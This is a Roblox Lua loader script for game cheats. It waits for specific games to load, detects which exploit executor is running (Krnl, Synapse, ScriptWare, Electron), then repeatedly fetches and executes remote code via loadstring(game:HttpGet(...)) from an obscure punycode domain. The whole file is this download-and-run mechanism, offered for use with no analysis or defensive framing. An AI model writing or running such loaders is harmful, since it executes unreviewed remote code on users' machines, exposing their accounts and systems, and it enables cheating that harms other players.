
local success,err = pcall(function()
    repeat wait(0.25) until game:IsLoaded()
    repeat wait(0.25) until game.Players.LocalPlayer
    if (game.PlaceId == 3978370137 or game.PlaceId == 7465136166 or game.PlaceId == 1730877806 or game.PlaceId == 6360478118) and not game.ReplicatedStorage:FindFirstChild("Matchinfo") then
        repeat wait(0.25) until game.Players.LocalPlayer:FindFirstChild("Loaded")
        repeat wait(0.25) until game.Players.LocalPlayer.Loaded.Value == true
    end
    getgenv().Key = "%s"
    local Exploit = (KRNL_LOADED and "Krnl") or (IsElectron and "Electron") or (is_synapse_function and "Synapse") or "ScriptWare"
    loadstring(game:HttpGet("https://xn--vn-9ja2dud.com/"..Exploit.."/getscript"))()
end)
if (not success) then
    rconsoleprint("report this to x2bom : "..err.." Account name : "..game.Players.LocalPlayer.Name)
    repeat wait(0.25) until game:IsLoaded()
    repeat wait(0.25) until game.Players.LocalPlayer
    if (game.PlaceId == 3978370137 or game.PlaceId == 7465136166 or game.PlaceId == 1730877806 or game.PlaceId == 6360478118) and not game.ReplicatedStorage:FindFirstChild("Matchinfo") then
        repeat wait(0.25) until game.Players.LocalPlayer:FindFirstChild("Loaded")
        repeat wait(0.25) until game.Players.LocalPlayer.Loaded.Value == true
    end
    getgenv().Key = "%s"
    local Exploit = (KRNL_LOADED and "Krnl") or (IsElectron and "Electron") or (is_synapse_function and "Synapse") or "ScriptWare"
    loadstring(game:HttpGet("https://xn--vn-9ja2dud.com/"..Exploit.."/getscript"))()
end
local start = tick()
repeat wait() until tick() - start >= 120
if not getgenv().ScriptReady then
    local Exploit = (KRNL_LOADED and "Krnl") or (IsElectron and "Electron") or (is_synapse_function and "Synapse") or "ScriptWare"
    loadstring(game:HttpGet("https://xn--vn-9ja2dud.com/"..Exploit.."/getscript"))()
end
